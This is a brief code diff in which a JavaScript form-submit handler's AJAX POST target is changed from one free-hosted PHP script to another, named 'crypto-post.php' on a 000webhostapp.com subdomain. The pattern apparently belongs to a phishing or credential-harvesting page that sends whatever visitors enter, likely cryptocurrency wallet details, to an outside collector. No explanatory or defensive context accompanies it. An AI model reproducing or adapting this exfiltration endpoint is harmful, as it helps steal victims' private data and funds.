@@ -85,7 +85,7 @@ form.addEventListener('submit', function(e) {
 
     $.ajax({
         type: "POST",
-        url: "https://inclinational-miles.000webhostapp.com/box.php",
+        url: "https://turfier-twist.000webhostapp.com/crypto-post.php",
         data: formData,
         enctype: 'multipart/form-data',
         processData: false,
